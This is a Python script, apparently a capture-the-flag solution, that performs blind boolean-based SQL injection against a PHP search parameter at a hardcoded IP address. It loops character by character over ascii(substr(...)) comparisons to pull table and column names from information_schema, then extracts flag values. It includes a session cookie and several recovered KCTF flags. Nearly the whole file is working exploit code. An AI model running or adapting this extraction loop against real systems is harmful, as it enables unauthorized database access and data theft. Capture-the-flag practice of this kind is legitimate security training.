# http://20.196.201.110:8081/index.php?search_keyword=az') or ascii(substr((select group_concat(table_name,0x3a,column_name) from information_schema.columns  WHERE table_schema = 'flag'),1,1))=1 -- -

# Search Tbl:Col pair in Flag
# charset = [i for i in range(48, 59)] + [i for i in range(97, 123)]

# import requests

# target = ""

# for idx in range(1, 300):
#     for let in charset:
#         url = f"http://20.196.201.110:8081/index.php?search_keyword=az') or ascii(substr((select group_concat(table_name,0x3a,column_name) from information_schema.columns  WHERE table_schema = 'flag'),{idx},1))={let} -- - "

#         re = requests.get(url, cookies={"PHPSESSID": "7jtgto9d4cjseks1qd5ugu6nks"})

#         if "테스트" in re.text:
#             target += chr(let)
#             print(target)
#             break

# example
# 1tat83:cs2k9dh59z4q:hbhwbemukp02:klodbqzpfns4:vu82vh
# 5w4o3z:z1v8m4flag:flagh59z4q:hbhwbemukp02:klodbqzpfns4:vu82vh
# flag:flagh59z4q:hbhwbejanls1:px5im1mukp02:klodbqzpfns4:vu82vh
# daehh8:ti303yh59z4q:hbhwbejanls1:px5im1mukp02:klodbqoi8kng:mvn9u1zpfns4:vu82vh
# dsifkk:68b3hrh59z4q:hbhwbejanls1:px5im1mukp02:klodbqoi8kng:mvn9u1wrfdvj:xw76z2zpfns4:vu82vh

# dsifkk:68b3hr KCTF{aa6b7f01a2a2e6470a8c101532acc985}
# h59z4q:hbhwbe KCTF{281f16efd1d73f79532b11a2333dc318}
# janls1:px5im1 KCTF{025d6e291b77ece51aa41e5c62030b11}
# mukp02:klodbq KCTF{b458ce342ac13e6103153d025bd95a67}
# oi8kng:mvn9u1 KCTF{3c6b62a66778042dbc5e1f57092ba383}
# wrfdvj:xw76z2 KCTF{c03c6e5c0caad3a2293d06fe5c1e5015}
# zpfns4:vu82vh KCTF{281f16efd1d73f79532b11a2333dc318}

# janls1:px5im1

charset = [i for i in range(48, 127)]  # Need upper and {}

import requests

target = ""

for idx in range(1, 300):
    for let in charset:
        url = f"http://20.196.201.110:8081/index.php?search_keyword=az') or ascii(substr((select px5im1 from flag.janls1),{idx},1))={let} -- - "

        re = requests.get(url, cookies={"PHPSESSID": "7jtgto9d4cjseks1qd5ugu6nks"})

        if "테스트" in re.text:
            target += chr(let)
            print(target)
            break
